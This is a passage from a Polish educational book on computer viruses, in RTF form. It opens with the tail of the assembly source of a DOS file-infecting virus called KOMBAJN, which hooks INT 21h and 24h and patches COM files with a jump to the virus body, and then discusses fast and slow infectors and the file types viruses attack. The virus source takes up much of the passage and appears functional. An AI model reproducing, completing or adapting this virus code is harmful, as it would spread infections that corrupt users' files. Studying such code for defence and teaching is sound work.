\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; elementu lancucha przerwan INT 21)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch StareInt21:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pushf                                  ; \\ symuluj  wywolanie przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call dword ptr cs:[Stare21Ofs]         ; / wywolaj stare przerwanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powroc z wywolania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukSI:                                    ; procedura wyswietla tekst z}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; CS:[DI+SI]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   di,si                            ; tekst w DI, dodaj SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Druk:                                      ; procedura wyswietla tekst z}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; CS:[DI]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax di                            ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukPetla:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   al,[di]                          ; pobierz znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     or    al,al                            ; czy koniec tekstu (znak=NUL) ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jz    DrukPowrot                       ; TAK - kocz pisanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,0Eh                           ; funkcja BIOS - wyswietl znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   10h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     inc   di                               ; zwieksz indeks (na nastepny znak)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   short DrukPetla                  ; idz po nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukPowrot:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   di ax                            ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukHEX16:                                 ; drukuje liczbe heksalna z AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax                               ; zachowaj AX (dokladniej AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   al,ah                            ; najpierw starsza czesc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  DrukHex8                         ; wyswietl AH}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ax                               ; przywroc AX (dokladniej AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; i wyswietl AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukHex8:                                  ; drukuje liczbe heksalna z AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax                               ; zachowaj AX (dokladniej 4 bity AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     shr   al,1                             ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     shr   al,1                             ;  \\ podziel AL przez 16,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     shr   al,1                             ;  / czyli wez 4 starsze bity AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     shr   al,1                             ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  DrukHex4                         ; i wydrukuj czesc liczby szesnastkowej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ax                               ; przywroc AX (dokladniej 4 bity AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     and   al,15                            ; wez 4 mlodsze bity AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; i wydrukuj czesc liczby szesnastkowej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukHex4:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   al,10                            ; \\   konwersja liczby binarnej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jb    Cyfra09                          ;  \\  na znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   al,'A'-'0'-10                    ;   - 00..09, 0Ah..0Fh na}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Cyfra09:                                   ;  /  '0'..'9', 'A'..'F'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   al,'0'                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,0Eh                           ; funkcja BIOS - wyswietl znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   10h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Decyzja:                                   ; \\     pobiera z klawiatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,0h                            ;  \\    znak i sprawdza, czy jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   16h                              ;   \\   to litera 'T'lub 't'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     and   al,0DFh                          ;    \\  jezeli tak, ustawia CF=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   al,'T'                           ;     \\ jezeli nie, ustawia CF=1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     clc                                    ;     /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    DecyzjaTak                       ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     stc                                    ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DecyzjaTak:                                ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweInt24:                                 ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   al,3                             ; sygnalizuj CF=1, gdy dowolny blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; nie wywoluj ARIF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     iret                                   ; powrot z przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          TeCopyRight db CR,LF,'KOMBAJN v1.0, Autor : Adam Blaszczyk 1997'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                      db CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeInstalacja       db CR,LF,'_ Zainstalowac KOMBAJNA w pamieci operacyjnej (T/N) ?',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeBylZainstalowany db CR,LF,'_ KOMBAJN jest juz w pamieci !',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeZainstalowany    db CR,LF,'_ KOMBAJN zostal zainstalowany w segmencie : ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeZnalazlemPlik    db CR,LF,'_ Znalazlem plik : "',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeInfekcja         db '"',CR,LF,'  Czy chcesz sprobowac zainfekowac go KOMBAJNEM (T/N) ?',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      StareBajty db 0CDh,20h,90h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Skok       db 0E9h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KoniecWirusa:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch all:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Skok2      dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      StaryDS    dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      StaryDX    dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Atrybut    db ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Czas       dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Stare24Ofs dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Stare24Seg dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KOMBAJN ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch end start}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 3.2.1. Szybkie infektory (ang.}{\f1\fs28\i\lang1045{\*\listtag0}fast infectors}{\f1\fs28\lang1045{\*\listtag0})}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Szybkie infektory przejmuj\uc1\u261\'b9 wszystkie mo\uc1\u380\'bfliwe funkcje systemu DOS, u\uc1\u380\'bfywane do obs\uc1\u322\'b3ugi plik\'f3w i zara\uc1\u380\'bfaj\uc1\u261\'b9 wszystko, co si\uc1\u281\'ea da, w maksymalnie kr\'f3tkim czasie, co powoduje, i\uc1\u380\'bf po okresie bardzo szybkiej ekspansji wirusa w danym systemie nast\uc1\u281\'eapuje jego pasywacja, gdy\uc1\u380\'bf wirus nie mo\uc1\u380\'bfe znale\uc1\u378\'9f\uc1\u263\'e6 kolejnej ofiary do zara\uc1\u380\'bfenia. Cz\uc1\u281\'easto pierwsz\uc1\u261\'b9 czynno\uc1\u347\'9cci\uc1\u261\'b9 wykonywan\uc1\u261\'b9 przez wirusa jest znisz}{\f1\fs24\lang1045{\*\listtag0}c}{\f0\fs24\lang1045{\*\listtag0}zenie w pami\uc1\u281\'eaci kodu zamazywalnej cz\uc1\u281\'ea\uc1\u347\'9cci interpretatora polece\uc1\u324\'f1, co sprawia, \uc1\u380\'bfe przy nast\uc1\u281\'eapnym wywo\uc1\u322\'b3aniu jakiegokolwiek polecenia z poziomu DOS plik zawieraj\uc1\u261\'b9cy interpretator polece\uc1\u324\'f1 (czyli najcz\uc1\u281\'ea\uc1\u347\'9cciej COMMAND.COM) zostanie ponownie uruchomiony i w efekci}{\f1\fs24\lang1045{\*\listtag0}e natychmiast zainfekowany.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Du\uc1\u380\'bfa aktywno\uc1\u347\'9c\uc1\u263\'e6 szybkiego infektora b\uc1\u281\'eadzie na pewno \uc1\u322\'b3atwo zauwa\uc1\u380\'bfalna dla u\uc1\u380\'bfytkownika - nawet tego, kt\'f3ry s\uc1\u322\'b3abo zna system. U\uc1\u380\'bfycie najlepszych nawet technik stealth (do\uc1\u347\'9c\uc1\u263\'e6 cz\uc1\u281\'easto stosowanych przez tego typu wirusy) tak\uc1\u380\'bfe si\uc1\u281\'ea nie sprawdzi, zw\uc1\u322\'b3aszcza gdy u\uc1\u380\'bfytkownik wykonuje du\uc1\u380\'bfo operacji dyskowych.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 3.2.2. Wolne infektory (ang. }{\f1\fs28\i\lang1045{\*\listtag0}slow infectors}{\f1\fs28\lang1045{\*\listtag0})}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wirusy tego typu s\uc1\u261\'b9 bardziej wyrafinowane ni\uc1\u380\'bf szybkie infektory. Ich g\uc1\u322\'b3\'f3wnym celem nie jest maksymalnie szybka ekspansja w systemie, lecz raczej jak najd\uc1\u322\'b3u\uc1\u380\'bfsze przetrwanie. Wirusy te u\uc1\u380\'bfywaj\uc1\u261\'b9 najcz\uc1\u281\'ea\uc1\u347\'9cciej wolnych, kilkustopniowych, zmiennych procedur szyfruj\uc1\u261\'b9cych i techniki stealth. Infekuj\uc1\u261\'b9 najcz\uc1\u281\'ea\uc1\u347\'9cciej tylko takie obiekty, kt\'f3re modyfikuje lub tworzy u\uc1\u380\'bfytkownik, a wi\uc1\u281\'eac nawet w przypadku sygnalizowa}{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0}ia jakiej\uc1\u347\'9c niebezpiecznej operacji przez ewentualny program antywirusowy u\uc1\u380\'bfytkownik b\uc1\u281\'eadzie przekonany, i\uc1\u380\'bf potwierdza wykonywane przez siebie czynno\uc1\u347\'9cci.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch S\uc1\u261\'b9 to wirusy bardzo trudne do wykrycia i usuni\uc1\u281\'eacia, nawet przez bardzo zaawansowane programy antywirusow}{\f1\fs24\lang1045{\*\listtag0}e.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs32\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 4}{\f0\fs32\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs32\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1. Pliki}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jedn\uc1\u261\'b9 z najcz\uc1\u281\'ea\uc1\u347\'9cciej wykorzystywanych dr\'f3g, jak\uc1\u261\'b9 przenosz\uc1\u261\'b9 si\uc1\u281\'ea wirusy. s\uc1\u261\'b9 pliki. Na samym pocz\uc1\u261\'b9tku by\uc1\u322\'b3y to tylko pliki wykonywalne COM, a potem EXE. Z czasem jednak liczba r\'f3\uc1\u380\'bfnorodnych plik\'f3w branych pod uwag\uc1\u281\'ea przez tw\'f3rc\'f3w wirus\'f3w wzros\uc1\u322\'b3a. Mo\uc1\u380\'bfna powiedzie\uc1\u263\'e6, i\uc1\u380\'bf w kr\uc1\u281\'eagu zainteresowa\uc1\u324\'f1 ludzi pisz\uc1\u261\'b9cych wirusy s\uc1\u261\'b9 wszystkie pliki, kt\'f3re posiadaj\uc1\u261\'b9 w swym wn\uc1\u281\'eatrzu struktury zawieraj\uc1\u261\'b9ce instrukcje steruj\uc1\u261\'b9ce oraz funkcje operuj\uc1\u261\'b9ce na plikach i/lub sektorach. Mog\uc1\u261\'b9 to wi\uc1\u281\'eac by\uc1\u263\'e6 pliki wykonywaln}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0} (COM, EXE), wsadowe (BAT), pliki zawieraj\uc1\u261\'b9ce sterowniki (SYS, BIN, DRV), pliki z modu\uc1\u322\'b3ami wykonywalnymi (OBJ, LIB, DLL, OV?, BGI, TPU, 386, VXD i inne), a tak\uc1\u380\'bfe pliki program\'f3w, udost\uc1\u281\'eapniaj\uc1\u261\'b9ce u\uc1\u380\'bfytkownikom definiowanie makr (DOC, XLS, SAM). Spotykane s\uc1\u261\'b9 }{\f1\fs24\lang1045{\*\listtag0}t}{\f0\fs24\lang1045{\*\listtag0}ak\uc1\u380\'bfe wirusy nietypowe, np. atakuj\uc1\u261\'b9ce programy napisane w asemb\uc1\u322\'b3erze (ASM). Rodzaj pliku rozstrzygany jest najcz\uc1\u281\'ea\uc1\u347\'9cciej na podstawie jego wewn\uc1\u281\'eatrznej budowy, tak wi\uc1\u281\'eac w wi\uc1\u281\'eakszo\uc1\u347\'9cci przypadk\'f3w zmiana rozszerzenia pliku nie pozwala na uchronienie go przed infe}{\f1\fs24\lang1045{\*\listtag0}k}{\f0\fs24\lang1045{\*\listtag0}cj\uc1\u261\'b9. Wewn\uc1\u281\'eatrzna struktura najcz\uc1\u281\'ea\uc1\u347\'9cciej zara\uc1\u380\'bfanych plik\'f3w oraz sposoby ich infekcji om\'f3wione zosta\uc1\u322\'b3y poni\uc1\u380\'bfej. W rozdziale opisuj\uc1\u261\'b9cym infekcj\uc1\u281\'ea plik\'f3w COM zawarto dodatkowo informacje na temat struktur tworzonych przez DOS podczas uruchamiania program\'f3w (blok}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}wst\uc1\u281\'eapny programu, otoczenie programu).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.1. Pliki wykonywalne COM}{\f1\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na sw\uc1\u261\'b9 prost\uc1\u261\'b9 budow\uc1\u281\'ea programy typu COM od pocz\uc1\u261\'b9tku stanowi\uc1\u322\'b3y smakowity k\uc1\u261\'b9sek dla tw\'f3rc\'f3w wirus\'f3w. Zawieraj\uc1\u261\'b9 one kod programu w tzw. postaci absolutnej, dlatego te\uc1\u380\'bf ich \uc1\u322\'b3adowanie do pami\uc1\u281\'eaci polega na wczytaniu zawarto\uc1\u347\'9cci pliku pod adres znajduj\uc1\u261\'b9cy si\uc1\u281\'ea bezpo\uc1\u347\'9crednio po tworzonym dla ka\uc1\u380\'bfdego procesu bloku wst\uc1\u281\'eapnym PSP i wykonaniu dalekiego skoku na pocz\uc1\u261\'b9tek programu,}{\f0\fs24\lang1045{\*\listtag0}\par}
